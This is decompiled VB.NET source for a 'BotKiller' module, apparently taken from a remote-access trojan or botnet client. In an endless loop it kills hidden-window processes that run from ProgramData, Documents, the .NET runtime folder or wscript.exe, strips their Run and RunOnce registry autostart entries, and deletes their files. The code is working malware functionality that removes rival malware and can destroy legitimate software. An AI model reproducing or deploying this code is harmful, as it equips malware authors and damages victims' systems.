Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.Principal
Imports System.Threading
Imports Microsoft.Win32

Namespace Main.Tools
	' Token: 0x0200002F RID: 47
	Friend Class BotKiller
		' Token: 0x0600010E RID: 270 RVA: 0x0000A8A8 File Offset: 0x00008AA8
		Public Shared Sub botKill()
			While True
				Try
					BotKiller.RunBotKiller()
				Catch
				End Try
				Thread.Sleep(2000)
			End While
		End Sub

		' Token: 0x0600010F RID: 271 RVA: 0x0000A8DC File Offset: 0x00008ADC
		Public Shared Sub RunBotKiller()
			For Each process As Process In Process.GetProcesses()
				Try
					Dim fileName As String = process.MainModule.FileName
					If BotKiller.Inspection(fileName) AndAlso Not BotKiller.IsWindowVisible(process.MainWindowHandle) Then
						process.Kill()
						BotKiller.RegistryDelete("Software\Microsoft\Windows\CurrentVersion\Run", fileName)
						BotKiller.RegistryDelete("Software\Microsoft\Windows\CurrentVersion\RunOnce", fileName)
						Thread.Sleep(100)
						File.Delete(fileName)
					End If
				Catch
				End Try
			Next
		End Sub

		' Token: 0x06000110 RID: 272 RVA: 0x0000A964 File Offset: 0x00008B64
		Private Shared Function Inspection(threat As String) As Boolean
			Return Not(threat = Process.GetCurrentProcess().MainModule.FileName) AndAlso (threat.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)) OrElse threat.Contains(Environment.GetFolderPath(Environment.SpecialFolder.Personal)) OrElse threat.Contains("wscript.exe") OrElse threat.Contains(RuntimeEnvironment.GetRuntimeDirectory()))
		End Function

		' Token: 0x06000111 RID: 273 RVA: 0x0000A9D8 File Offset: 0x00008BD8
		Private Shared Function IsWindowVisible(lHandle As String) As Boolean
			Return BotKiller.IsWindowVisible(lHandle)
		End Function

		' Token: 0x06000112 RID: 274 RVA: 0x0000A9EC File Offset: 0x00008BEC
		Private Shared Sub RegistryDelete(regPath As String, payload As String)
			Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey(regPath, True)
				If registryKey IsNot Nothing Then
					For Each text As String In registryKey.GetValueNames()
						If registryKey.GetValue(text).ToString().Equals(payload) Then
							registryKey.DeleteValue(text)
						End If
					Next
				End If
			End Using
			If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
				Using registryKey2 As RegistryKey = Registry.LocalMachine.OpenSubKey(regPath, True)
					If registryKey2 IsNot Nothing Then
						For Each text2 As String In registryKey2.GetValueNames()
							If registryKey2.GetValue(text2).ToString().Equals(payload) Then
								registryKey2.DeleteValue(text2)
							End If
						Next
					End If
				End Using
			End If
		End Sub

		' Token: 0x06000113 RID: 275
		Private Declare Function IsWindowVisible Lib "user32.dll" (hWnd As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
	End Class
End Namespace
